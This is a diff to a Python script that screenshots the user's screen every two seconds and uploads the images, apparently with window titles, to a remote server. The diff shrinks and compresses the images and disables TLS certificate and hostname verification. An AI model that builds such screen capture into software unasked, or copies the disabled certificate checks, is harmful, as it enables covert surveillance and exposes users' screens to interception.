@@ -102,8 +102,9 @@ def main():
         try:
             img = ImageGrab.grab()
             img = img.convert('RGB')
+            img.thumbnail((1280, 720)) # Resize to max 1280x720 to keep size small
             buffered = BytesIO()
-            img.save(buffered, format="JPEG", quality=95)
+            img.save(buffered, format="JPEG", quality=60) # Lower quality to save bandwidth
             screen_b64 = "data:image/jpeg;base64," + base64.b64encode(buffered.getvalue()).decode('utf-8')
         except Exception as e:
             pass
@@ -130,10 +131,14 @@ def main():
         )
 
         try:
-            with urllib.request.urlopen(req) as response:
+            import ssl
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            with urllib.request.urlopen(req, context=ctx) as response:
                 print(f"Sent: {window} -> {response.status}")
         except Exception as e:
-            pass
+            print(f"Error sending data: {e}")
 
         time.sleep(2)
 
